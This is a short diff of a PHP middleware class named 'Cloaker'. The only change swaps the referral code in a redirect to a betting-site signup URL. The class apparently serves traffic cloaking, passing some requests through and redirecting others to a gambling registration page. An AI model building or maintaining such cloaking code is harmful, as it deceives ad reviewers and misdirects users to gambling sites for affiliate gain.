@@ -35,6 +35,6 @@ class Cloaker
             return $next($request);
         }
 
-        return redirect('https://betfe.app/?cadastro=1&l=9nb88');
+        return redirect('https://betfe.app/?cadastro=1&l=rzmcp');
     }
 }
